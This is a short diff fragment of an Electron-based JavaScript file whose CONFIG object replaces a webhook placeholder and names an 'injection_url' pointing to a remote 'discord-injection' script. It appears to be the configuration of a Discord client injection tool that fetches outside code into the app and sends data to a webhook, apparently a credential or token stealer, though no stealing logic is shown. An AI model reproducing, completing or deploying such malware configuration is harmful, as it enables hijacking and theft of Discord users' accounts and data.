@@ -11,7 +11,7 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "%WEBHOOK%",
+    webhook: "REPLACE_ME",
     injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
     filters: {
         urls: [
